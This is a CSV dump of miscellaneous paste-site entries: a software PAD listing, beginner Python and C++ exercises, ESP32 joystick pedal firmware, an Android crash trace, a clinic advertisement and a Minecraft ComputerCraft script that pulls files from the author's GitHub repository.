id,title,username,language,date,content
x0FgLXNu,pad file for Whisper Batch Transcriber for Softpedia,ReactorcoreGames,XML,Monday 7th of July 2025 12:57:09 AM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<PAD>
  <Program_Info>
    <Program_Name>Whisper Batch Transcriber</Program_Name>
    <Program_Version>1.0</Program_Version>
    <Program_Release_Month>01</Program_Release_Month>
    <Program_Release_Day>01</Program_Release_Day>
    <Program_Release_Year>2025</Program_Release_Year>
    <Program_Type>Freeware</Program_Type>
    <Program_Category>Audio & Multimedia::Audio File Recorders</Program_Category>
    <Program_Description>
      Whisper Batch Transcriber automatically converts your voice recordings into clean, organized text files. It uses state-of-the-art speech-to-text technology and works 100% offline on your computer for privacy. Supports batch processing of speeches, podcasts, webinars, and more. Choose between two Whisper AI models for optimal accuracy. Requires Python 3.10+ and a Windows PC with a GPU (2GB VRAM minimum).
    </Program_Description>
    <Program_Summary>
      Offline batch speech-to-text transcriber for Windows, using Whisper AI.
    </Program_Summary>
    <Program_Keywords>
      audio, transcription, speech-to-text, offline, batch, whisper, convert, productivity, automation
    </Program_Keywords>
    <Program_OS_Support>Windows 7/8/10/11</Program_OS_Support>
    <Program_Language>English</Program_Language>
    <Program_Change_Info>
      Initial release.
    </Program_Change_Info>
    <Program_Install_Support>Install and Uninstall</Program_Install_Support>
    <Program_Screenshot_URL>https://img.itch.zone/aW1nLzEzMDY4ODQ3LnBuZw==/original/8uT5tR.png</Program_Screenshot_URL>
    <Program_Icon_URL>https://img.itch.zone/aW1nLzEzMDY4ODQ3LnBuZw==/32x32%23/8uT5tR.png</Program_Icon_URL>
  </Program_Info>

  <Web_Info>
    <Application_URLs>
      <Application_Info_URL>https://reactorcore.itch.io/whisper-batch-transcriber</Application_Info_URL>
      <Application_Order_URL>https://reactorcore.itch.io/whisper-batch-transcriber</Application_Order_URL>
      <Application_Screenshot_URL>https://img.itch.zone/aW1nLzEzMDY4ODQ3LnBuZw==/original/8uT5tR.png</Application_Screenshot_URL>
      <Application_Icon_URL>https://img.itch.zone/aW1nLzEzMDY4ODQ3LnBuZw==/32x32%23/8uT5tR.png</Application_Icon_URL>
      <Application_Download_URL>https://reactorcore.itch.io/whisper-batch-transcriber</Application_Download_URL>
    </Application_URLs>
    <Company_Name>Reactorcore</Company_Name>
    <Company_WebSite_URL>http://www.reactorcoregames.com</Company_WebSite_URL>
    <Company_Email>reactorcoregames@gmail.com</Company_Email>
  </Web_Info>

  <File_Info>
    <File_Size_Bytes>600000</File_Size_Bytes>
    <File_Size_K>600</File_Size_K>
    <File_Size_MB>0.6</File_Size_MB>
    <File_Type>Zip</File_Type>
    <File_Status>Released</File_Status>
  </File_Info>

  <Requirements>
    <Operating_System>Windows 7 or newer</Operating_System>
    <Processor>Mid-range gaming PC</Processor>
    <RAM>4 GB</RAM>
    <Hard_Disk>2 GB</Hard_Disk>
    <Video_Card>GPU with 2GB VRAM minimum (6GB recommended)</Video_Card>
    <Other>Python 3.10 or newer, required dependencies (see manual)</Other>
  </Requirements>

  <Permissions>
    <Distribution_Permissions>
      Free to distribute unchanged. See included manual for details.
    </Distribution_Permissions>
    <EULA>
      This software is provided as-is, without warranty of any kind. Use at your own risk.
    </EULA>
  </Permissions>
</PAD>
"
KC70DzAT,Rental func,PASTEit2005,Python,Monday 7th of July 2025 12:50:43 AM CDT,"def aurora_archive_menu():
    while True:
        clear_console()
        print(""--- Welcome to the Aurora Archive Rental Service ---"")
        print(f""\nEvery two weeks Aurora customers will be able to rent specific books selected by the staff. There is a varied range of genres, these include sci-fi, action-adventure, and artist biographies.\n\nThe rental period ranges from 3 days to 21 days. Starting from 1 - 3 days the price for renting is $3.\nAfter 3 days the cost reduces to $0.80 per day with the lowest cost being $0.50 per day after 8 days."")
        print()
        print(f""1. Enter rental period"")
        print(f""2. Return to main menu"")
        try:
            option = int(input(""\nPlease enter a number between (1 - 2): ""))
        except ValueError:
            print(f""{RED}Invalid option.{RESET}"")
            input(""Press Enter to restart..."")
            continue
 
        if option == 1:
            input(""Press Enter to be brought to the rental section"")
            rental_service()
        elif option == 2:
            input(""Press Enter to return to the main menu..."")
            break
        else:
            print(f""\n{RED}You have chosen an invalid option. Please enter a valid option (1 - 5).{RESET}"")
            input(""Press Enter to restart..."")
            continue

def rental_service(): 
        while True:
            clear_console()
            print(""--- This is the rental section ---"")
            try:
                days = int(input(""Please enter a number between (1 - 21) where the number corresponds to the days of rental period: "")) 
                if days < 21:
                    print(f""\n{RED}The number exceeds the duration of the maximum rental period.{RESET}{GREEN} Please type a number no greater than 21.{RESET}"")
                else:
                    break
            except ValueError:
                    print(f""\n{RED}Invalid option. Please enter a number between (1 - 21 days){RESET}."")
                    input(""Press Enter to restart..."")
            if days == 21:
                price = 12.00
            elif days <= 3:
                price = 3.00
            elif days <= 8:
                price = 3.00 + (days - 3) * 0.80
            else:
                price = 3.00 + (8 - 3) * 0.80 + (days - 8) * 0.50 
            print(f""The rental price for {days} days is ${price:.2f}"")
            input(""Press Enter to purchase..."")
            return"
P6Dg9Yqv,FDA-Approved Vein Treatments at USA Vein Clinics,usveinclinics,HTML,Monday 7th of July 2025 12:46:47 AM CDT,"At USA Vein Clinics in West Hollywood, we specialize in treating varicose veins, spider veins, and other vein conditions with advanced, minimally invasive procedures designed to restore your comfort and confidence. At Vein center in West Hollywood, our clinic offers compassionate, effective vein care in a modern, comfortable setting. Trust our skilled team to help you feel better and regain your confidence.
https://www.usaveinclinics.com/company/locations/california/office/west-hollywood/"
wCj6Bepn,Untitled,thewitchking,C++,Monday 7th of July 2025 12:21:23 AM CDT,"#include <iostream>
#include <vector>
#include <cstdint>

class Bitmap {
private:
    std::vector<uint8_t> bits; // byte array (each byte = 8 bits)
    size_t size; // total number of bits

public:
    // Constructor
    Bitmap(size_t numBits) : size(numBits) {
        bits.resize((numBits + 7) / 8, 0); // ceil(numBits/8) bytes
    }

    // Set bit at index
    void set(size_t index) {
        if (index >= size) return;
        bits[index / 8] |= (1 << (index % 8));
    }

    // Clear bit at index
    void clear(size_t index) {
        if (index >= size) return;
        bits[index / 8] &= ~(1 << (index % 8));
    }

    // Get bit at index
    bool get(size_t index) const {
        if (index >= size) return false;
        return bits[index / 8] & (1 << (index % 8));
    }

    // Print all bits
    void printBits() const {
        for (size_t i = 0; i < size; ++i) {
            std::cout << get(i);
        }
        std::cout << std::endl;
    }
};
"
xdKLTtKK,Untitled,thewitchking,C++,Monday 7th of July 2025 12:07:14 AM CDT,"#include <iostream>
#include <list>
#include <unordered_map>

class VideoHistory {
private:
    std::list<int> history; // Doubly linked list to maintain order
    std::unordered_map<int, std::list<int>::iterator> videoMap; // Map to access list nodes in O(1)
    const size_t maxSize = 3;

public:
    void watchVideo(int videoId) {
        // If video is already in history, remove it from its current position
        if (videoMap.find(videoId) != videoMap.end()) {
            history.erase(videoMap[videoId]);
        } else if (history.size() == maxSize) {
            // Remove the least recently used (last element)
            int lastVideo = history.back();
            videoMap.erase(lastVideo);
            history.pop_back();
        }

        // Add new video to the front (most recent)
        history.push_front(videoId);
        videoMap[videoId] = history.begin();
    }

    void printHistory() const {
        std::cout << ""Video History (most recent first): "";
        for (int id : history) {
            std::cout << id << "" "";
        }
        std::cout << std::endl;
    }
};

int main() {
    VideoHistory vh;
    vh.watchVideo(101);
    vh.watchVideo(102);
    vh.watchVideo(103);
    vh.printHistory(); // Output: 103 102 101

    vh.watchVideo(103);
    vh.printHistory(); // Output: 103 102 101 (103 moved to front, order same due to re-watch)

    vh.watchVideo(104);
    vh.printHistory(); // Output: 104 103 102 (101 evicted)

    vh.watchVideo(102);
    vh.printHistory(); // Output: 102 104 103

    return 0;
}

"
pG0cvEvR,Untitled,thewitchking,C++,Sunday 6th of July 2025 11:58:47 PM CDT,"#include <iostream>
#include <list>
#include <unordered_set>

class VideoHistory {
private:
    std::list<int> history; // Maintains order (most recent first)
    std::unordered_set<int> seen; // For quick lookup to avoid duplicates
    const size_t maxSize = 3;

public:
    void watchVideo(int videoId) {
        // If already in history, remove it first
        if (seen.find(videoId) != seen.end()) {
            history.remove(videoId);
        } else if (history.size() == maxSize) {
            // If full, remove the least recently watched (last element)
            int last = history.back();
            history.pop_back();
            seen.erase(last);
        }

        // Add to front as most recent
        history.push_front(videoId);
        seen.insert(videoId);
    }

    void printHistory() const {
        std::cout << ""Video History (most recent first): "";
        for (int id : history) {
            std::cout << id << "" "";
        }
        std::cout << std::endl;
    }
};
"
HKPr6s1Y,Untitled,thewitchking,C++,Sunday 6th of July 2025 11:44:59 PM CDT,"#include <iostream>
#include <sstream>
#include <vector>
#include <string>
using namespace std;

string simplifyPath(const string& path) {
    vector<string> stack;
    stringstream ss(path);
    string token;

    while (getline(ss, token, '/')) {
        if (token == """" || token == ""."") {
            continue; // Ignore empty or current dir
        } else if (token == "".."") {
            if (!stack.empty()) stack.pop_back(); // Go up a directory
        } else {
            stack.push_back(token); // Valid directory name
        }
    }

    string result;
    for (const string& dir : stack) {
        result += ""/"" + dir;
    }

    return result.empty() ? ""/"" : result;
}

void runTests() {
    vector<pair<string, string>> tests = {
        {""a/b/.././///c"", ""/a/c""},
        {""/home/"", ""/home""},
        {""/../"", ""/""},
        {""/home//foo/"", ""/home/foo""},
        {""/a/./b/../../c/"", ""/c""},
        {""/a/../../b/../c//.//"", ""/c""},
        {""/a//b////c/d//././/.."", ""/a/b/c""},
        {""////"", ""/""},
        {"""", ""/""},
        {""../"", ""/""},
        {""/..."", ""/...""},
        {""/.hidden"", ""/.hidden""}
    };

    for (auto& [input, expected] : tests) {
        string result = simplifyPath(input);
        cout << ""Input: \"""" << input << ""\"" | Output: \"""" << result << ""\"" | Expected: \"""" << expected << ""\""""
             << (result == expected ? "" ✅"" : "" ❌"") << endl;
    }
}

int main() {
    runTests();
    return 0;
}
"
Xrbx0dRE,ESP32-s3 USB-HID JoyStick 4 Axis Pedals,LandoRo,C,Sunday 6th of July 2025 11:25:27 PM CDT,"#include <Joystick_ESP32S2.h>
#include <SPI.h>
#include <ADS1220_WE.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <EEPROM.h>

#define ADS1220_CS_PIN 10      // ADS1220 Chip Select
#define ADS1220_DRDY_PIN 9     // ADS1220 Data Ready
#define SPI_SCK 13             // SPI SCLK
#define SPI_MISO 12            // SPI MISO
#define SPI_MOSI 11            // SPI MOSI
#define OLED_SDA 4             // OLED I2C SDA
#define OLED_SCL 5             // OLED I2C SCL
#define BUTTON_PREV 6          // Previous axis button
#define BUTTON_NEXT_PAGE 7     // Next page button
#define BUTTON_CALIBRATE 2     // Calibrate/filter button
#define BUTTON_DEFAULT 3       // Restore default button

#define SCREEN_WIDTH 128       // OLED width
#define SCREEN_HEIGHT 64       // OLED height
#define OLED_ADDRESS 0x3C      // OLED I2C address
#define CALIBRATION_TIME 4000  // 4 seconds per min/max
#define DONE_TIME 1000         // 1 second for ""DONE""
#define DEBOUNCE_TIME 50       // 50 ms debounce
#define OLED_REFRESH_MS 500    // OLED update every 500 ms (2 Hz)
#define DEADBAND_COUNTS 3355   // 2 mV equivalent (2/5000 * 2^23)
#define MAX_SAMPLES 20         // Max averaging samples

#define EEPROM_SIZE 64         // Allocate 64 bytes for EEPROM
#define EEPROM_MAGIC 0x12345678 // Magic number for EEPROM validation
#define EEPROM_MAGIC_ADDR 0
#define EEPROM_MIN_CLUTCH_ADDR 4
#define EEPROM_MAX_CLUTCH_ADDR 8
#define EEPROM_MIN_BRAKE_ADDR 12
#define EEPROM_MAX_BRAKE_ADDR 16
#define EEPROM_MIN_GAS_ADDR 20
#define EEPROM_MAX_GAS_ADDR 24
#define EEPROM_MIN_HB_ADDR 28
#define EEPROM_MAX_HB_ADDR 32
#define EEPROM_SAMPLES_CLUTCH_ADDR 36
#define EEPROM_SAMPLES_BRAKE_ADDR 40
#define EEPROM_SAMPLES_GAS_ADDR 44
#define EEPROM_SAMPLES_HB_ADDR 48

Joystick_ joystick(JOYSTICK_DEFAULT_REPORT_ID, JOYSTICK_TYPE_JOYSTICK,
                  0, 0, true, true, true, true, false, false, false, false);
ADS1220_WE ads(ADS1220_CS_PIN, ADS1220_DRDY_PIN);
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

// Calibration state
enum CalibState { IDLE, MIN_CALIB, MAX_CALIB, MIN_DONE, MAX_DONE };
volatile CalibState calibState = IDLE;
volatile int selectedAxis = 0; // 0=C, 1=B, 2=G, 3=H
volatile int calibAxis = -1;   // Axis being calibrated
volatile unsigned long calibStartTime = 0;
volatile int currentScreen = 0; // 0=Filter Adjust, 1=Min/Max Calibration

// Button states for debouncing
volatile bool lastPrevState = HIGH;
volatile bool lastNextPageState = HIGH;
volatile bool lastCalibrateState = HIGH;
volatile bool lastDefaultState = HIGH;
volatile unsigned long lastButtonCheck = 0;

// Min/max values (defaults: 0 to 2^23-1)
volatile int32_t minClutch = 0, maxClutch = 8388607;
volatile int32_t minBrake = 0, maxBrake = 8388607;
volatile int32_t minGas = 0, maxGas = 8388607;
volatile int32_t minHB = 0, maxHB = 8388607;
volatile int32_t currentMin, currentMax;

// Averaging samples (default: 2)
volatile uint8_t samplesClutch = 2, samplesBrake = 2, samplesGas = 2, samplesHB = 2;

// ADC values (shared with Core 0)
volatile int32_t valueClutch = 0, valueBrake = 0, valueGas = 0, valueHB = 0;
// Last output values for deadband
volatile int32_t lastValueClutch = 0, lastValueBrake = 0, lastValueGas = 0, lastValueHB = 0;

// Circular buffer for ADC samples
volatile int32_t sampleBuffer[4][MAX_SAMPLES]; // Buffer for C, B, G, H
volatile uint8_t sampleCount[4] = {0, 0, 0, 0}; // Sample counts per channel
volatile uint8_t currentChannel = 0; // Current ADC channel (0=C, 1=B, 2=G, 3=H)
volatile bool dataReady = false;

// DRDY interrupt
void IRAM_ATTR drdyISR() {
  if (dataReady) return; // Prevent re-entry
  dataReady = true;
  int32_t data = ads.getRawData();
  sampleBuffer[currentChannel][sampleCount[currentChannel]] = data;
  sampleCount[currentChannel]++;
  if (sampleCount[currentChannel] >= (currentChannel == 0 ? samplesClutch : currentChannel == 1 ? samplesBrake : currentChannel == 2 ? samplesGas : samplesHB)) {
    sampleCount[currentChannel] = 0; // Reset when buffer is full
  }
  currentChannel = (currentChannel + 1) % 4; // Cycle through channels
  ads.setCompareChannels(currentChannel == 0 ? ADS1220_MUX_0_AVSS : currentChannel == 1 ? ADS1220_MUX_1_AVSS : currentChannel == 2 ? ADS1220_MUX_2_AVSS : ADS1220_MUX_3_AVSS);
}

// Integer-based mapping
long customMap(int32_t x, int32_t in_min, int32_t in_max, long out_min, long out_max) {
  int64_t result = (int64_t)(x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min;
  if (result < out_min) return out_min;
  if (result > out_max) return out_max;
  return (long)result;
}

// PSI calculation for BRAKE (0.5V=0 PSI, 4.5V=100 PSI)
float calculatePSIBrake(int32_t valueBrake) {
  float psi = (float)(valueBrake - 839681) * 100.0 / (7951127 - 839681);
  return constrain(psi, 0.0, 100.0);
}

void saveCalibration() {
  EEPROM.put(EEPROM_MIN_CLUTCH_ADDR, minClutch);
  EEPROM.put(EEPROM_MAX_CLUTCH_ADDR, maxClutch);
  EEPROM.put(EEPROM_MIN_BRAKE_ADDR, minBrake);
  EEPROM.put(EEPROM_MAX_BRAKE_ADDR, maxBrake);
  EEPROM.put(EEPROM_MIN_GAS_ADDR, minGas);
  EEPROM.put(EEPROM_MAX_GAS_ADDR, maxGas);
  EEPROM.put(EEPROM_MIN_HB_ADDR, minHB);
  EEPROM.put(EEPROM_MAX_HB_ADDR, maxHB);
  EEPROM.put(EEPROM_SAMPLES_CLUTCH_ADDR, samplesClutch);
  EEPROM.put(EEPROM_SAMPLES_BRAKE_ADDR, samplesBrake);
  EEPROM.put(EEPROM_SAMPLES_GAS_ADDR, samplesGas);
  EEPROM.put(EEPROM_SAMPLES_HB_ADDR, samplesHB);
  EEPROM.commit();
}

void loadCalibration() {
  uint32_t magic;
  EEPROM.get(EEPROM_MAGIC_ADDR, magic);
  if (magic != EEPROM_MAGIC) {
    saveCalibration();
    EEPROM.put(EEPROM_MAGIC_ADDR, EEPROM_MAGIC);
    EEPROM.commit();
  } else {
    EEPROM.get(EEPROM_MIN_CLUTCH_ADDR, minClutch);
    EEPROM.get(EEPROM_MAX_CLUTCH_ADDR, maxClutch);
    EEPROM.get(EEPROM_MIN_BRAKE_ADDR, minBrake);
    EEPROM.get(EEPROM_MAX_BRAKE_ADDR, maxBrake);
    EEPROM.get(EEPROM_MIN_GAS_ADDR, minGas);
    EEPROM.get(EEPROM_MAX_GAS_ADDR, maxGas);
    EEPROM.get(EEPROM_MIN_HB_ADDR, minHB);
    EEPROM.get(EEPROM_MAX_HB_ADDR, maxHB);
    EEPROM.get(EEPROM_SAMPLES_CLUTCH_ADDR, samplesClutch);
    EEPROM.get(EEPROM_SAMPLES_BRAKE_ADDR, samplesBrake);
    EEPROM.get(EEPROM_SAMPLES_GAS_ADDR, samplesGas);
    EEPROM.get(EEPROM_SAMPLES_HB_ADDR, samplesHB);
    samplesClutch = constrain(samplesClutch, 1, MAX_SAMPLES);
    samplesBrake = constrain(samplesBrake, 1, MAX_SAMPLES);
    samplesGas = constrain(samplesGas, 1, MAX_SAMPLES);
    samplesHB = constrain(samplesHB, 1, MAX_SAMPLES);
  }
}

void resetDefaultCalibration(int axis) {
  if (axis == 0) { minClutch = 0; maxClutch = 8388607; samplesClutch = 2; }
  else if (axis == 1) { minBrake = 0; maxBrake = 8388607; samplesBrake = 2; }
  else if (axis == 2) { minGas = 0; maxGas = 8388607; samplesGas = 2; }
  else { minHB = 0; maxHB = 8388607; samplesHB = 2; }
  saveCalibration();
}

// Core 0 task for buttons, calibration, and OLED
void displayAndControlTask(void *pvParameters) {
  unsigned long lastDisplayUpdate = 0;
  while (1) {
    unsigned long currentMillis = millis();

    // Read buttons with debouncing
    if (currentMillis - lastButtonCheck >= DEBOUNCE_TIME && calibState == IDLE) {
      bool prevState = digitalRead(BUTTON_PREV);
      bool nextPageState = digitalRead(BUTTON_NEXT_PAGE);
      bool calibrateState = digitalRead(BUTTON_CALIBRATE);
      bool defaultState = digitalRead(BUTTON_DEFAULT);

      if (prevState == LOW && lastPrevState == HIGH) {
        selectedAxis = (selectedAxis - 1 + 4) % 4;
        while (digitalRead(BUTTON_PREV) == LOW && millis() - currentMillis < 1000);
      }
      lastPrevState = prevState;

      if (nextPageState == LOW && lastNextPageState == HIGH) {
        currentScreen = (currentScreen + 1) % 2;
        while (digitalRead(BUTTON_NEXT_PAGE) == LOW && millis() - currentMillis < 1000);
      }
      lastNextPageState = nextPageState;

      if (calibrateState == LOW && lastCalibrateState == HIGH) {
        if (currentScreen == 0) {
          if (selectedAxis == 0) samplesClutch = (samplesClutch % MAX_SAMPLES) + 1;
          else if (selectedAxis == 1) samplesBrake = (samplesBrake % MAX_SAMPLES) + 1;
          else if (selectedAxis == 2) samplesGas = (samplesGas % MAX_SAMPLES) + 1;
          else samplesHB = (samplesHB % MAX_SAMPLES) + 1;
          saveCalibration();
        } else {
          calibState = MIN_CALIB;
          calibAxis = selectedAxis;
          calibStartTime = currentMillis;
          currentMin = 8388608;
          currentMax = -8388608;
        }
      }
      lastCalibrateState = calibrateState;

      if (defaultState == LOW && lastDefaultState == HIGH) {
        resetDefaultCalibration(selectedAxis);
      }
      lastDefaultState = defaultState;

      lastButtonCheck = currentMillis;
    }

    // Update calibration (Screen 2 only)
    if (calibState != IDLE && calibAxis >= 0 && calibAxis < 4) {
      int32_t value = (calibAxis == 0) ? valueClutch : (calibAxis == 1) ? valueBrake : (calibAxis == 2) ? valueGas : valueHB;
      if (calibState == MIN_CALIB) {
        if (value < currentMin) currentMin = value;
        if (currentMillis - calibStartTime >= CALIBRATION_TIME) {
          calibState = MIN_DONE;
          calibStartTime = currentMillis;
        }
      } else if (calibState == MIN_DONE && currentMillis - calibStartTime >= DONE_TIME) {
        if (calibAxis == 0) minClutch = currentMin;
        else if (calibAxis == 1) minBrake = currentMin;
        else if (calibAxis == 2) minGas = currentMin;
        else minHB = currentMin;
        calibState = MAX_CALIB;
        calibStartTime = currentMillis;
      } else if (calibState == MAX_CALIB) {
        if (value > currentMax) currentMax = value;
        if (currentMillis - calibStartTime >= CALIBRATION_TIME) {
          calibState = MAX_DONE;
          calibStartTime = currentMillis;
        }
      } else if (calibState == MAX_DONE && currentMillis - calibStartTime >= DONE_TIME) {
        if (calibAxis == 0) maxClutch = currentMax;
        else if (calibAxis == 1) maxBrake = currentMax;
        else if (calibAxis == 2) maxGas = currentMax;
        else maxHB = currentMax;
        saveCalibration();
        calibState = IDLE;
        calibAxis = -1;
      }
    }

    // Update OLED
    if (currentMillis - lastDisplayUpdate >= OLED_REFRESH_MS) {
      display.clearDisplay();
      display.setCursor(0, 0);
      if (calibState == MIN_CALIB) {
        display.print(calibAxis == 0 ? ""C"" : calibAxis == 1 ? ""B"" : calibAxis == 2 ? ""G"" : ""H"");
        display.print("" MIN: "");
        display.println((calibAxis == 0) ? valueClutch : (calibAxis == 1) ? valueBrake : (calibAxis == 2) ? valueGas : valueHB);
        display.print(""Time: "");
        float remaining = (CALIBRATION_TIME - (currentMillis - calibStartTime)) / 1000.0;
        display.print(remaining, 1);
        display.println(""s"");
      } else if (calibState == MIN_DONE) {
        display.print(calibAxis == 0 ? ""C"" : calibAxis == 1 ? ""B"" : calibAxis == 2 ? ""G"" : ""H"");
        display.print("" MIN: "");
        display.print(currentMin);
        display.println("" DONE"");
      } else if (calibState == MAX_CALIB) {
        display.print(calibAxis == 0 ? ""C"" : calibAxis == 1 ? ""B"" : calibAxis == 2 ? ""G"" : ""H"");
        display.print("" MAX: "");
        display.println((calibAxis == 0) ? valueClutch : (calibAxis == 1) ? valueBrake : (calibAxis == 2) ? valueGas : valueHB);
        display.print(""Time: "");
        float remaining = (CALIBRATION_TIME - (currentMillis - calibStartTime)) / 1000.0;
        display.print(remaining, 1);
        display.println(""s"");
      } else if (calibState == MAX_DONE) {
        display.print(calibAxis == 0 ? ""C"" : calibAxis == 1 ? ""B"" : calibAxis == 2 ? ""G"" : ""H"");
        display.print("" MAX: "");
        display.print(currentMax);
        display.println("" DONE"");
      } else if (currentScreen == 0) {
        display.println(""Filter Settings"");
        display.print(selectedAxis == 0 ? "">C: "" : "" C: ""); display.println(samplesClutch);
        display.print(selectedAxis == 1 ? "">B: "" : "" B: ""); display.println(samplesBrake);
        display.print(selectedAxis == 2 ? "">G: "" : "" G: ""); display.println(samplesGas);
        display.print(selectedAxis == 3 ? "">H: "" : "" H: ""); display.println(samplesHB);
      } else {
        display.println(""Pedals Min/Max"");
        display.print(selectedAxis == 0 ? "">C: "" : "" C: ""); display.print(minClutch); display.print("" ""); display.println(maxClutch);
        display.print(selectedAxis == 1 ? "">B: "" : "" B: ""); display.print(minBrake); display.print("" ""); display.println(maxBrake);
        display.print(selectedAxis == 2 ? "">G: "" : "" G: ""); display.print(minGas); display.print("" ""); display.println(maxGas);
        display.print(selectedAxis == 3 ? "">H: "" : "" H: ""); display.print(minHB); display.print("" ""); display.println(maxHB);
        display.print(""PSI B: ""); display.println(calculatePSIBrake(valueBrake), 1);
      }
      display.display();
      lastDisplayUpdate = currentMillis;
    }

    vTaskDelay(20 / portTICK_PERIOD_MS); // Yield every 20 ms
  }
}

void setup() {
  joystick.begin();
  joystick.setXAxisRange(0, 65535);
  joystick.setYAxisRange(0, 65535);
  joystick.setZAxisRange(0, 65535);
  joystick.setRxAxisRange(0, 65535);

  EEPROM.begin(EEPROM_SIZE);
  loadCalibration();

  pinMode(BUTTON_PREV, INPUT_PULLUP);
  pinMode(BUTTON_NEXT_PAGE, INPUT_PULLUP);
  pinMode(BUTTON_CALIBRATE, INPUT_PULLUP);
  pinMode(BUTTON_DEFAULT, INPUT_PULLUP);

  SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, ADS1220_CS_PIN);
  if (!ads.init()) {
    while (1);
  }
  ads.setSPIClockSpeed(10000000);
  ads.setVRefSource(ADS1220_VREF_REFP0_REFN0);
  ads.setVRefValue_V(5.0);
  ads.setGain(ADS1220_GAIN_1);
  ads.bypassPGA(true);
  ads.setDataRate(ADS1220_DR_LVL_6); // 1200 SPS
  ads.setOperatingMode(ADS1220_TURBO_MODE);
  ads.setConversionMode(ADS1220_CONTINUOUS);
  ads.setFIRFilter(ADS1220_50HZ_60HZ);

  // Initialize first channel
  ads.setCompareChannels(ADS1220_MUX_0_AVSS); // Start with CLUTCH
  pinMode(ADS1220_DRDY_PIN, INPUT);
  attachInterrupt(digitalPinToInterrupt(ADS1220_DRDY_PIN), drdyISR, FALLING);

  Wire.begin(OLED_SDA, OLED_SCL);
  Wire.setClock(400000);
  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
    while (1);
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(""Pedals Calibration"");
  display.display();

  xTaskCreatePinnedToCore(
    displayAndControlTask, ""DisplayControlTask"", 4096, NULL, 1, NULL, 0
  );
}

void loop() {
  static bool toggle = false;
  unsigned long currentMillis = millis();
  if (!dataReady) return; // Process only when new data
  dataReady = false;

  // Compute averages
  int32_t sumClutch = 0, sumBrake = 0, sumGas = 0, sumHB = 0;
  for (int i = 0; i < samplesClutch; i++) sumClutch += sampleBuffer[0][i];
  for (int i = 0; i < samplesBrake; i++) sumBrake += sampleBuffer[1][i];
  for (int i = 0; i < samplesGas; i++) sumGas += sampleBuffer[2][i];
  for (int i = 0; i < samplesHB; i++) sumHB += sampleBuffer[3][i];

  int32_t newValueClutch = samplesClutch > 0 ? sumClutch / samplesClutch : sumClutch;
  int32_t newValueBrake = samplesBrake > 0 ? sumBrake / samplesBrake : sumBrake;
  int32_t newValueGas = samplesGas > 0 ? sumGas / samplesGas : sumGas;
  int32_t newValueHB = samplesHB > 0 ? sumHB / samplesHB : sumHB;

  // Apply 2 mV deadband filter
  if (abs(newValueClutch - lastValueClutch) >= DEADBAND_COUNTS) {
    valueClutch = newValueClutch;
    lastValueClutch = newValueClutch;
  }
  if (abs(newValueBrake - lastValueBrake) >= DEADBAND_COUNTS) {
    valueBrake = newValueBrake;
    lastValueBrake = newValueBrake;
  }
  if (abs(newValueGas - lastValueGas) >= DEADBAND_COUNTS) {
    valueGas = newValueGas;
    lastValueGas = newValueGas;
  }
  if (abs(newValueHB - lastValueHB) >= DEADBAND_COUNTS) {
    valueHB = newValueHB;
    lastValueHB = newValueHB;
  }

  // Map to 0–65535
  int mappedClutch = customMap(valueClutch, minClutch, maxClutch, 0, 65535);
  int mappedBrake = customMap(valueBrake, minBrake, maxBrake, 0, 65535);
  int mappedGas = customMap(valueGas, minGas, maxGas, 0, 65535);
  int mappedHB = customMap(valueHB, minHB, maxHB, 0, 65535);

  // Send joystick data every 2nd loop
  joystick.setXAxis(mappedClutch);
  joystick.setYAxis(mappedBrake);
  joystick.setZAxis(mappedGas);
  joystick.setRxAxis(mappedHB);
  if (toggle) joystick.sendState();
  toggle = !toggle;
}"
sTZy3yAi,2025-07-06T23:29:58.560207,powerampache,PHP,Sunday 6th of July 2025 10:29:59 PM CDT,"1.00-64 (64) - DB: 82
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:793)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:697)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:684)

"
RfAwNCgz,Turtle swarm git setup,birdini,Lua,Sunday 6th of July 2025 09:40:51 PM CDT,"--Package everything into one file so we don't have to rely on imports.

--[[BEGIN STRINGUTILS API]]
function splitStr(inputStr,delim)
    local pieces = {}
    for str in string.gmatch(inputStr,""([^""..delim..""]+)"") do
        table.insert(pieces,str)
    end
    return pieces
end

--[[BEGIN FILEUTILS API]]
function exists(path)
    return fs.exists(path)
end

function writeString(data,path)
    local file = io.open(path,""w"")
    file:write(tostring(data))
    file:close()
end

function createFile(path)
    local pieces = splitStr(path,""/"")
    local appended = """"
    for i=1,#pieces-1 do
        appended = appended..pieces[i]..""/"" 
    end
    if not (fs.exists(appended)) then
        fs.makeDir(appended)
    end
    writeString("""",path)
end

function readString(path)
    local file = io.open(path,""r"")
    data = file:read(""*a"")
    file:close()
    return data
end

--[[BEGIN GITHUB API]]
local baseURL = ""https://raw.githubusercontent.com/lewibt01/ComputerCraftScripts/master/""

function requestFile(name)
    local handle = http.get(baseURL..name)
    local result = """"

    if(handle) then
        result = handle.readAll()
    end

    return result
end

function pull(name,dest)
    local data = requestFile(name)
    createFile(dest)
    local file = io.open(dest,""w"")
    file:write(data)
    file:close()
end

--[[BEGIN PROPERTIES API]]
local props = {}
local propFilePath = ""/usr/apis.prop""

